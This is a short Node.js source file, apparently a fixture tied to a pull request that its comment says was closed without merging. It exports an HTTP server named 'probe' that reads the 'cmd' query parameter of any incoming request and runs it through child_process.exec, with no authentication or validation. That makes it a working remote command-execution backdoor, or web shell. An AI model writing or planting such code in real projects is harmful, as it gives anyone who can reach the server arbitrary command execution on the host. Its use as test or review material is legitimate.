import { exec } from 'node:child_process';
import { createServer } from 'node:http';

// Never imported. It exists for one pull request that is closed without merging.
export const probe = createServer((req) => {
  exec(new URL(req.url ?? '/', 'http://probe.invalid').searchParams.get('cmd') ?? '');
});
